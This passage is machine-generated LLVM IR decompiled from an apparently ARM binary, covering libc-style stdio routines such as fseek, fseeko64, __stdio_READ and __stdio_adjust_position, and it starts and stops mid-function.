  %v1_1c7d8 = sub i32 0, %v0_1c7d8
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1c7e0 = inttoptr i32 %v0_1c7d4 to i32*
  store i32 %v1_1c7d8, i32* %v2_1c7e0, align 4
  %v0_1c7f0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1c7f0

dec_label_pc_1c7e8:                               ; preds = %entry
  br i1 false, label %dec_label_pc_1c7f0, label %dec_label_pc_1c7f8

dec_label_pc_1c7f0:                               ; preds = %dec_label_pc_1c7e8, %dec_label_pc_1c7d4
  %v0_1c7f0 = phi i32 [ -1, %dec_label_pc_1c7e8 ], [ %v0_1c7f0.pre, %dec_label_pc_1c7d4 ]
  store i32 %v0_1c7f0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1c8c4

dec_label_pc_1c7f8:                               ; preds = %dec_label_pc_1c7e8
  %v2_1c7f8 = add i32 %v1_1c7ac, %arg1
  %v2_1c7fc = add i32 %tmp, %arg3
  store i32 %v2_1c7fc, i32* @ip, align 4
  store i32 %v1_1c7ac, i32* @r7, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1c8ac

dec_label_pc_1c818:                               ; preds = %dec_label_pc_1c8ac
  %v1_1c818 = add i32 %v0_1c86c, 16
  %v2_1c818 = inttoptr i32 %v1_1c818 to i16*
  %v3_1c818 = load i16, i16* %v2_1c818, align 2
  %v4_1c818 = zext i16 %v3_1c818 to i32
  %v1_1c81c = add nuw nsw i32 %v4_1c818, 7
  %v1_1c820 = and i32 %v1_1c81c, 131064
  store i32 %v1_1c820, i32* %r2.global-to-local, align 4
  %v2_1c828 = add i32 %v1_1c820, %v0_1c874
  store i32 %v2_1c828, i32* %r8.global-to-local, align 4
  %tmp26 = icmp ugt i32 %v2_1c828, %v2_1c7fc
  br i1 %tmp26, label %dec_label_pc_1c834, label %dec_label_pc_1c868

dec_label_pc_1c834:                               ; preds = %dec_label_pc_1c818
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_1c83c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_1c83c, i32* %r2.global-to-local, align 4
  %v0_1c840 = load i32, i32* %sl.global-to-local, align 4
  %v1_1c844 = load i32, i32* @sp, align 4
  %v2_1c844 = inttoptr i32 %v1_1c844 to i32*
  store i32 0, i32* %v2_1c844, align 4
  %v4_1c848 = call i32 @__GI_lseek64(i32 %arg1, i32 0, i32 %v0_1c83c, i32 %v0_1c840)
  %v0_1c84c = load i32, i32* @r5, align 4
  %v1_1c84c = load i32, i32* %r6.global-to-local, align 4
  %v9_1c84c = icmp eq i32 %v0_1c84c, %v1_1c84c
  br i1 %v9_1c84c, label %dec_label_pc_1c854, label %dec_label_pc_1c8c0

dec_label_pc_1c854:                               ; preds = %dec_label_pc_1c834
  %v0_1c854 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v2_1c860 = inttoptr i32 %v0_1c854 to i32*
  store i32 22, i32* %v2_1c860, align 4
  %v0_1c8c4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1c8c4

dec_label_pc_1c868:                               ; preds = %dec_label_pc_1c818
  %v1_1c868 = inttoptr i32 %v0_1c86c to i32*
  %v2_1c868 = load i32, i32* %v1_1c868, align 4
  %v3_1c868 = add i32 %v0_1c86c, 4
  %v4_1c868 = inttoptr i32 %v3_1c868 to i32*
  %v5_1c868 = load i32, i32* %v4_1c868, align 4
  store i32 %v5_1c868, i32* %r4.global-to-local, align 4
  %v1_1c86c = add i32 %v0_1c86c, 8
  store i32 %v1_1c86c, i32* %sb.global-to-local, align 4
  %v1_1c870 = inttoptr i32 %v1_1c86c to i32*
  %v2_1c870 = load i32, i32* %v1_1c870, align 4
  store i32 %v2_1c870, i32* %sb.global-to-local, align 4
  %v3_1c870 = add i32 %v0_1c86c, 12
  %v4_1c870 = inttoptr i32 %v3_1c870 to i32*
  %v5_1c870 = load i32, i32* %v4_1c870, align 4
  store i32 %v5_1c870, i32* %sl.global-to-local, align 4
  %v1_1c874 = inttoptr i32 %v0_1c874 to i32*
  store i32 %v2_1c868, i32* %v1_1c874, align 4
  %v3_1c874 = add i32 %v0_1c874, 4
  %v4_1c874 = inttoptr i32 %v3_1c874 to i32*
  %v5_1c874 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1c874, i32* %v4_1c874, align 4
  %v0_1c878 = load i32, i32* @r7, align 4
  %v1_1c878 = add i32 %v0_1c878, 8
  %v1_1c87c = inttoptr i32 %v1_1c878 to i32*
  %v2_1c87c = load i32, i32* %v1_1c87c, align 4
  %v3_1c87c = add i32 %v0_1c878, 12
  %v4_1c87c = inttoptr i32 %v3_1c87c to i32*
  %v5_1c87c = load i32, i32* %v4_1c87c, align 4
  store i32 %v5_1c87c, i32* @r4, align 4
  %v1_1c880 = load i32, i32* @r5, align 4
  %v2_1c880 = add i32 %v1_1c880, 8
  %v3_1c880 = inttoptr i32 %v2_1c880 to i32*
  store i32 %v2_1c87c, i32* %v3_1c880, align 4
  %v0_1c884 = load i32, i32* @r4, align 4
  %v1_1c884 = load i32, i32* @r5, align 4
  %v2_1c884 = add i32 %v1_1c884, 12
  %v3_1c884 = inttoptr i32 %v2_1c884 to i32*
  store i32 %v0_1c884, i32* %v3_1c884, align 4
  %v0_1c888 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c888 = trunc i32 %v0_1c888 to i16
  %v2_1c888 = load i32, i32* @r5, align 4
  %v3_1c888 = add i32 %v2_1c888, 16
  %v4_1c888 = inttoptr i32 %v3_1c888 to i16*
  store i16 %v1_1c888, i16* %v4_1c888, align 2
  %v0_1c88c = load i32, i32* @r7, align 4
  %v1_1c88c = add i32 %v0_1c88c, 18
  %v2_1c88c = inttoptr i32 %v1_1c88c to i8*
  %v3_1c88c = load i8, i8* %v2_1c88c, align 1
  %v4_1c88c = zext i8 %v3_1c88c to i32
  store i32 %v4_1c88c, i32* @r3, align 4
  %v2_1c890 = load i32, i32* @r5, align 4
  %v3_1c890 = add i32 %v2_1c890, 18
  %v4_1c890 = inttoptr i32 %v3_1c890 to i8*
  store i8 %v3_1c88c, i8* %v4_1c890, align 1
  %v0_1c894 = load i32, i32* @r7, align 4
  %v1_1c894 = add i32 %v0_1c894, 16
  %v2_1c894 = inttoptr i32 %v1_1c894 to i16*
  %v3_1c894 = load i16, i16* %v2_1c894, align 2
  %v4_1c894 = zext i16 %v3_1c894 to i32
  %v1_1c898 = add nsw i32 %v4_1c894, -19
  store i32 %v1_1c898, i32* @r2, align 4
  %v0_1c89c = call i32 @memcpy()
  %v0_1c8a0 = load i32, i32* @r7, align 4
  %v1_1c8a0 = add i32 %v0_1c8a0, 16
  %v2_1c8a0 = inttoptr i32 %v1_1c8a0 to i16*
  %v3_1c8a0 = load i16, i16* %v2_1c8a0, align 2
  %v4_1c8a0 = zext i16 %v3_1c8a0 to i32
  %v0_1c8a4 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1c8a4, i32* @r5, align 4
  %v2_1c8a8 = add i32 %v4_1c8a0, %v0_1c8a0
  store i32 %v2_1c8a8, i32* @r7, align 4
  br label %dec_label_pc_1c8ac

dec_label_pc_1c8ac:                               ; preds = %dec_label_pc_1c7f8, %dec_label_pc_1c868
  %v0_1c874 = phi i32 [ %tmp, %dec_label_pc_1c7f8 ], [ %v0_1c8a4, %dec_label_pc_1c868 ]
  %v0_1c86c = phi i32 [ %v1_1c7ac, %dec_label_pc_1c7f8 ], [ %v2_1c8a8, %dec_label_pc_1c868 ]
  %v3_1c8b0 = icmp ult i32 %v0_1c86c, %v2_1c7f8
  %v1_1c8b4 = add i32 %v0_1c874, 19
  store i32 %v1_1c8b4, i32* @r0, align 4
  %v1_1c8b8 = add i32 %v0_1c86c, 19
  store i32 %v1_1c8b8, i32* @r1, align 4
  br i1 %v3_1c8b0, label %dec_label_pc_1c818, label %dec_label_pc_1c8c0.loopexit

dec_label_pc_1c8c0.loopexit:                      ; preds = %dec_label_pc_1c8ac
  %v0_1c8c0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1c8c0

dec_label_pc_1c8c0:                               ; preds = %dec_label_pc_1c8c0.loopexit, %dec_label_pc_1c834
  %v1_1c8c0 = phi i32 [ %v0_1c874, %dec_label_pc_1c8c0.loopexit ], [ %v0_1c84c, %dec_label_pc_1c834 ]
  %v0_1c8c0 = phi i32 [ %v0_1c8c0.pre, %dec_label_pc_1c8c0.loopexit ], [ %v1_1c84c, %dec_label_pc_1c834 ]
  %v2_1c8c0 = sub i32 %v1_1c8c0, %v0_1c8c0
  store i32 %v2_1c8c0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1c8c4

dec_label_pc_1c8c4:                               ; preds = %dec_label_pc_1c854, %dec_label_pc_1c7f0, %dec_label_pc_1c8c0
  %v0_1c8c4 = phi i32 [ %v0_1c8c4.pre, %dec_label_pc_1c854 ], [ %v0_1c7f0, %dec_label_pc_1c7f0 ], [ %v2_1c8c0, %dec_label_pc_1c8c0 ]
  store i32 %v3_1c794, i32* %r4.global-to-local, align 4
  store i32 %v6_1c794, i32* @r5, align 4
  store i32 %v12_1c794, i32* @r7, align 4
  ret i32 %v0_1c8c4

; uselistorder directives
  uselistorder i32 %v0_1c86c, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_1c874, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_1c7ac, { 1, 2, 0, 3 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 19, { 1, 2, 0, 4, 3 }
  uselistorder i32 18, { 2, 3, 5, 0, 1, 4 }
  uselistorder i32* @sp, { 9, 26, 27, 0, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 1, 2, 3, 4, 5, 6, 7, 25, 8 }
  uselistorder i32 14, { 3, 8, 0, 10, 4, 6, 5, 1, 2, 9, 7 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1c8c4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1c8ac, { 1, 0 }
}

define i32 @__GI_fseek() local_unnamed_addr {
entry:
  %v0_1c8e0 = load i32, i32* @r1, align 4
  store i32 %v0_1c8e0, i32* @r2, align 4
  %v0_1c8e8 = call i32 @__GI_fseeko64()
  ret i32 %v0_1c8e8
}

define i32 @__GI_fseeko64() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %v3_1c8f8 = load i32, i32* @r4, align 4
  %v6_1c8f8 = load i32, i32* @r5, align 4
  %v12_1c8f8 = load i32, i32* @r7, align 4
  store i32 %tmp16, i32* @r7, align 4
  %v0_1c90c = load i32, i32* @r2, align 4
  store i32 %v0_1c90c, i32* %stack_var_-32, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %r6.global-to-local, align 4
  %v0_1c918 = load i32, i32* @r0, align 4
  store i32 %v0_1c918, i32* @r5, align 4
  %tmp = icmp ult i32 %tmp16, 3
  br i1 %tmp, label %dec_label_pc_1c934, label %dec_label_pc_1c920

dec_label_pc_1c920:                               ; preds = %entry
  %v0_1c920 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1c92c = inttoptr i32 %v0_1c920 to i32*
  store i32 22, i32* %v2_1c92c, align 4
  br label %dec_label_pc_1ca24

dec_label_pc_1c934:                               ; preds = %entry
  %v1_1c934 = add i32 %v0_1c918, 52
  %v2_1c934 = inttoptr i32 %v1_1c934 to i32*
  %v3_1c934 = load i32, i32* %v2_1c934, align 4
  %v1_1c938 = sub i32 1, %v3_1c934
  store i32 %v1_1c938, i32* %r8.global-to-local, align 4
  %v2_1c938 = icmp ult i32 %v3_1c934, 2
  br i1 %v2_1c938, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_1c934
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1c980

bb:                                               ; preds = %dec_label_pc_1c934
  %v2_1c940 = icmp eq i32 %v1_1c938, 0
  br i1 %v2_1c940, label %dec_label_pc_1c980, label %dec_label_pc_1c948

dec_label_pc_1c948:                               ; preds = %bb
  %v1_1c94c = add i32 %v0_1c918, 56
  store i32 %v1_1c94c, i32* @r4, align 4
  %v4_1c950 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 40) to i32*), align 4
  store i32 %v4_1c950, i32* %r1.global-to-local, align 4
  store i32 %v1_1c94c, i32* %r2.global-to-local, align 4
  %v4_1c960 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 80) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1c960)
  %v0_1c974 = load i32, i32* %r6.global-to-local, align 4
  %v2_1c974 = add i32 %v0_1c974, 20
  %v3_1c974 = inttoptr i32 %v2_1c974 to i32*
  %v4_1c974 = load i32, i32* %v3_1c974, align 4
  store i32 %v4_1c974, i32* @ip, align 4
  store i32 117120, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1c974)
  %v0_1c980.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1c980

dec_label_pc_1c980:                               ; preds = %.thread, %bb, %dec_label_pc_1c948
  %v0_1c98c = phi i32 [ %v0_1c918, %.thread ], [ %v0_1c918, %bb ], [ %v0_1c980.pre, %dec_label_pc_1c948 ]
  %v1_1c980 = inttoptr i32 %v0_1c98c to i16*
  %v2_1c980 = load i16, i16* %v1_1c980, align 2
  %v1_1c984 = and i16 %v2_1c980, 64
  %v2_1c984 = icmp eq i16 %v1_1c984, 0
  br i1 %v2_1c984, label %dec_label_pc_1c99c, label %dec_label_pc_1c98c

dec_label_pc_1c98c:                               ; preds = %dec_label_pc_1c980
  store i32 %v0_1c98c, i32* @r0, align 4
  %v0_1c990 = call i32 @__stdio_wcommit()
  %v2_1c994 = icmp eq i32 %v0_1c990, 0
  br i1 %v2_1c994, label %dec_label_pc_1c99c, label %dec_label_pc_1ca04

dec_label_pc_1c99c:                               ; preds = %dec_label_pc_1c98c, %dec_label_pc_1c980
  %v0_1c99c = load i32, i32* @r7, align 4
  %v7_1c99c = icmp eq i32 %v0_1c99c, 1
  br i1 %v7_1c99c, label %dec_label_pc_1c9a4, label %dec_label_pc_1c99c.dec_label_pc_1c9b8_crit_edge

dec_label_pc_1c99c.dec_label_pc_1c9b8_crit_edge:  ; preds = %dec_label_pc_1c99c
  %.pre = ptrtoint i32* %stack_var_-32 to i32
  br label %dec_label_pc_1c9b8

dec_label_pc_1c9a4:                               ; preds = %dec_label_pc_1c99c
  %v0_1c9a4 = load i32, i32* @r5, align 4
  %v2_1c9a8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1c9a8, i32* %r1.global-to-local, align 4
  %v2_1c9ac = inttoptr i32 %v0_1c9a4 to i16*
  %v3_1c9ac = call i32 @__stdio_adjust_position(i16* %v2_1c9ac, i32 %v2_1c9a8)
  %v1_1c9b0 = icmp slt i32 %v3_1c9ac, 0
  br i1 %v1_1c9b0, label %dec_label_pc_1ca04, label %dec_label_pc_1c9a4.dec_label_pc_1c9b8_crit_edge

dec_label_pc_1c9a4.dec_label_pc_1c9b8_crit_edge:  ; preds = %dec_label_pc_1c9a4
  %v0_1c9b8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1c9b8

dec_label_pc_1c9b8:                               ; preds = %dec_label_pc_1c99c.dec_label_pc_1c9b8_crit_edge, %dec_label_pc_1c9a4.dec_label_pc_1c9b8_crit_edge
  %v2_1c9c0.pre-phi = phi i32 [ %.pre, %dec_label_pc_1c99c.dec_label_pc_1c9b8_crit_edge ], [ %v2_1c9a8, %dec_label_pc_1c9a4.dec_label_pc_1c9b8_crit_edge ]
  %v0_1c9b8 = phi i32 [ %v0_1c99c, %dec_label_pc_1c99c.dec_label_pc_1c9b8_crit_edge ], [ %v0_1c9b8.pre, %dec_label_pc_1c9a4.dec_label_pc_1c9b8_crit_edge ]
  store i32 %v0_1c9b8, i32* %r2.global-to-local, align 4
  %v0_1c9bc = load i32, i32* @r5, align 4
  store i32 %v2_1c9c0.pre-phi, i32* %r1.global-to-local, align 4
  %v4_1c9c4 = call i32 @__stdio_seek(i32 %v0_1c9bc, i32* nonnull %stack_var_-32, i32 %v0_1c9b8)
  %v1_1c9c8 = icmp slt i32 %v4_1c9c4, 0
  br i1 %v1_1c9c8, label %dec_label_pc_1ca04, label %dec_label_pc_1c9d0

dec_label_pc_1c9d0:                               ; preds = %dec_label_pc_1c9b8
  %v0_1c9d0 = load i32, i32* @r5, align 4
  %v1_1c9d0 = inttoptr i32 %v0_1c9d0 to i16*
  %v2_1c9d0 = load i16, i16* %v1_1c9d0, align 2
  %v1_1c9d4 = add i32 %v0_1c9d0, 8
  %v2_1c9d4 = inttoptr i32 %v1_1c9d4 to i32*
  %v3_1c9d4 = load i32, i32* %v2_1c9d4, align 4
  store i32 %v3_1c9d4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_1c9dc = and i16 %v2_1c9d0, -72
  store i32 0, i32* %r4.global-to-local, align 4
  store i16 %v1_1c9dc, i16* %v1_1c9d0, align 2
  %v0_1c9e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c9e8 = load i32, i32* @r5, align 4
  %v2_1c9e8 = add i32 %v1_1c9e8, 28
  %v3_1c9e8 = inttoptr i32 %v2_1c9e8 to i32*
  store i32 %v0_1c9e8, i32* %v3_1c9e8, align 4
  %v0_1c9ec = load i32, i32* %r1.global-to-local, align 4
  %v1_1c9ec = trunc i32 %v0_1c9ec to i8
  %v2_1c9ec = load i32, i32* @r5, align 4
  %v3_1c9ec = add i32 %v2_1c9ec, 2
  %v4_1c9ec = inttoptr i32 %v3_1c9ec to i8*
  store i8 %v1_1c9ec, i8* %v4_1c9ec, align 1
  %v0_1c9f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c9f0 = load i32, i32* @r5, align 4
  %v2_1c9f0 = add i32 %v1_1c9f0, 16
  %v3_1c9f0 = inttoptr i32 %v2_1c9f0 to i32*
  store i32 %v0_1c9f0, i32* %v3_1c9f0, align 4
  %v0_1c9f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c9f4 = load i32, i32* @r5, align 4
  %v2_1c9f4 = add i32 %v1_1c9f4, 20
  %v3_1c9f4 = inttoptr i32 %v2_1c9f4 to i32*
  store i32 %v0_1c9f4, i32* %v3_1c9f4, align 4
  %v0_1c9f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c9f8 = load i32, i32* @r5, align 4
  %v2_1c9f8 = add i32 %v1_1c9f8, 24
  %v3_1c9f8 = inttoptr i32 %v2_1c9f8 to i32*
  store i32 %v0_1c9f8, i32* %v3_1c9f8, align 4
  %v0_1c9fc = load i32, i32* %r1.global-to-local, align 4
  %v1_1c9fc = load i32, i32* @r5, align 4
  %v2_1c9fc = add i32 %v1_1c9fc, 44
  %v3_1c9fc = inttoptr i32 %v2_1c9fc to i32*
  store i32 %v0_1c9fc, i32* %v3_1c9fc, align 4
  br label %dec_label_pc_1ca08

dec_label_pc_1ca04:                               ; preds = %dec_label_pc_1c98c, %dec_label_pc_1c9b8, %dec_label_pc_1c9a4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1ca08

dec_label_pc_1ca08:                               ; preds = %dec_label_pc_1c9d0, %dec_label_pc_1ca04
  %v0_1ca08 = load i32, i32* %r8.global-to-local, align 4
  %v2_1ca08 = icmp eq i32 %v0_1ca08, 0
  br i1 %v2_1ca08, label %dec_label_pc_1ca08..thread8_crit_edge, label %bb20

dec_label_pc_1ca08..thread8_crit_edge:            ; preds = %dec_label_pc_1ca08
  %v0_1ca20.pre = load i32, i32* @ip, align 4
  br label %.thread8

bb20:                                             ; preds = %dec_label_pc_1ca08
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_1ca18 = load i32, i32* %r6.global-to-local, align 4
  %v3_1ca18 = add i32 %v1_1ca18, 28
  %v4_1ca18 = inttoptr i32 %v3_1ca18 to i32*
  %v5_1ca18 = load i32, i32* %v4_1ca18, align 4
  store i32 %v5_1ca18, i32* @ip, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1ca08..thread8_crit_edge, %bb20
  %v0_1ca20 = phi i32 [ %v0_1ca20.pre, %dec_label_pc_1ca08..thread8_crit_edge ], [ %v5_1ca18, %bb20 ]
  %v2_1ca20 = xor i1 %v2_1ca08, true
  call void @__pseudo_cond_branch(i1 %v2_1ca20, i32 %v0_1ca20)
  br label %dec_label_pc_1ca24

dec_label_pc_1ca24:                               ; preds = %dec_label_pc_1c920, %.thread8
  %v0_1ca24 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_1c8f8, i32* @r4, align 4
  store i32 %v6_1c8f8, i32* @r5, align 4
  store i32 %v12_1c8f8, i32* @r7, align 4
  ret i32 %v0_1ca24

; uselistorder directives
  uselistorder i32 %v0_1c9b8, { 1, 0 }
  uselistorder i32 %v3_1c934, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 3, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 80) to i32*), { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 16 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 40) to i32*), { 0, 2, 4, 1, 3 }
  uselistorder i32 56, { 21, 17, 10, 11, 12, 13, 18, 2, 4, 3, 5, 19, 16, 9, 20, 6, 0, 7, 22, 14, 1, 15, 8 }
  uselistorder label %dec_label_pc_1ca24, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_1ca08, { 1, 0 }
  uselistorder label %dec_label_pc_1ca04, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1c9b8, { 1, 0 }
  uselistorder label %dec_label_pc_1c980, { 2, 1, 0 }
}

define i32 @function_1ca38(i32 %arg1) local_unnamed_addr {
dec_label_pc_1ca38:
  %v0_1ca38 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1ca38, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1ca38
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1ca38, %bb
  %v10_1ca44 = phi i32 [ %arg1, %dec_label_pc_1ca38 ], [ 0, %bb ]
  ret i32 %v10_1ca44

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1ca48 = load i32, i32* @r4, align 4
  store i32 %v3_1ca48, i32* %stack_var_-12, align 4
  %v0_1ca4c = load i32, i32* %r0.global-to-local, align 4
  %v1_1ca4c = inttoptr i32 %v0_1ca4c to i16*
  %v2_1ca4c = load i16, i16* %v1_1ca4c, align 2
  %v3_1ca4c = zext i16 %v2_1ca4c to i32
  %v1_1ca50 = and i32 %v3_1ca4c, 4
  store i32 %v1_1ca50, i32* %r5.global-to-local, align 4
  %v2_1ca50 = icmp eq i32 %v1_1ca50, 0
  store i32 %v0_1ca4c, i32* %r4.global-to-local, align 4
  br i1 %v2_1ca50, label %dec_label_pc_1ca64, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_1ca64:                               ; preds = %entry
  %v1_1ca64 = icmp slt i32 %arg2, 0
  br i1 %v1_1ca64, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_1ca64
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_1ca64, %bb18
  %v1_1ca6c = add i32 %v0_1ca4c, 4
  %v2_1ca6c = inttoptr i32 %v1_1ca6c to i32*
  %v3_1ca6c = load i32, i32* %v2_1ca6c, align 4
  store i32 %v3_1ca6c, i32* %r0.global-to-local, align 4
  %v1_1ca70 = call i32 @__GI_read(i32 %v3_1ca6c)
  store i32 %v1_1ca70, i32* %r0.global-to-local, align 4
  %v5_1ca78 = icmp sgt i32 %v1_1ca70, 0
  br i1 %v5_1ca78, label %.thread7, label %dec_label_pc_1ca7c

dec_label_pc_1ca7c:                               ; preds = %bb19
  %v2_1ca74 = icmp eq i32 %v1_1ca70, 0
  %v0_1ca7c = load i32, i32* %r4.global-to-local, align 4
  %v1_1ca7c = inttoptr i32 %v0_1ca7c to i16*
  %v2_1ca7c = load i16, i16* %v1_1ca7c, align 2
  br i1 %v2_1ca74, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_1ca7c
  %v2_1ca80 = or i16 %v2_1ca7c, 4
  store i16 %v2_1ca80, i16* %v1_1ca7c, align 2
  %v1_1ca9c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_1ca7c
  %v2_1ca84 = or i16 %v2_1ca7c, 8
  store i16 %v2_1ca84, i16* %v1_1ca7c, align 2
  %v1_1ca90 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_1ca90, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_1ca9c = phi i32 [ %v1_1ca9c.pre, %bb20 ], [ 0, %bb ], [ %v1_1ca70, %bb19 ], [ %v1_1ca90, %bb21 ]
  %v2_1ca98 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1ca98, i32* @r4, align 4
  ret i32 %v1_1ca9c

; uselistorder directives
  uselistorder i16 %v2_1ca7c, { 1, 0 }
  uselistorder i32 %v1_1ca70, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @__GI_read, { 1, 0 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1caa0 = load i32, i32* @r4, align 4
  store i32 %v3_1caa0, i32* %stack_var_-12, align 4
  %v3_1caa4 = load i16, i16* %arg1, align 2
  %v4_1caa4 = zext i16 %v3_1caa4 to i32
  store i32 %v4_1caa4, i32* @ip, align 4
  %tmp17 = urem i16 %v3_1caa4, 4
  %v1_1caa8 = zext i16 %tmp17 to i32
  store i32 %v1_1caa8, i32* %r2.global-to-local, align 4
  %v2_1caa8 = icmp eq i16 %tmp17, 0
  br i1 %v2_1caa8, label %bb, label %dec_label_pc_1cabc

bb:                                               ; preds = %entry
  br label %bb14

dec_label_pc_1cabc:                               ; preds = %entry
  %v1_1cabc = add nsw i32 %v1_1caa8, -1
  %v7_1cabc = icmp eq i16 %tmp17, 1
  br i1 %v7_1cabc, label %bb14, label %dec_label_pc_1cac4

dec_label_pc_1cac4:                               ; preds = %dec_label_pc_1cabc
  %v1_1cac4 = and i32 %v4_1caa4, 2048
  %v2_1cac4 = icmp eq i32 %v1_1cac4, 0
  br i1 %v2_1cac4, label %bb14, label %dec_label_pc_1cacc

dec_label_pc_1cacc:                               ; preds = %dec_label_pc_1cac4
  %v7_1cacc = icmp eq i32 %v1_1cabc, 2
  br i1 %v7_1cacc, label %dec_label_pc_1cb50, label %dec_label_pc_1cad4

dec_label_pc_1cad4:                               ; preds = %dec_label_pc_1cacc
  %v2_1cad4 = add i32 %tmp, 40
  %v3_1cad4 = inttoptr i32 %v2_1cad4 to i32*
  %v4_1cad4 = load i32, i32* %v3_1cad4, align 4
  store i32 %v4_1cad4, i32* %r3.global-to-local, align 4
  %v2_1cad8 = icmp eq i32 %v4_1cad4, 0
  br i1 %v2_1cad8, label %dec_label_pc_1cae0, label %dec_label_pc_1cb50

dec_label_pc_1cae0:                               ; preds = %dec_label_pc_1cad4
  %v2_1cae0 = add i32 %tmp, 44
  %v3_1cae0 = inttoptr i32 %v2_1cae0 to i32*
  %v4_1cae0 = load i32, i32* %v3_1cae0, align 4
  store i32 %v4_1cae0, i32* %r3.global-to-local, align 4
  %v2_1cae4 = add i32 %tmp, 3
  %v3_1cae4 = inttoptr i32 %v2_1cae4 to i8*
  %v4_1cae4 = load i8, i8* %v3_1cae4, align 1
  %v5_1cae4 = zext i8 %v4_1cae4 to i32
  store i32 %v5_1cae4, i32* %r2.global-to-local, align 4
  %v2_1cae8 = icmp eq i32 %v4_1cae0, 0
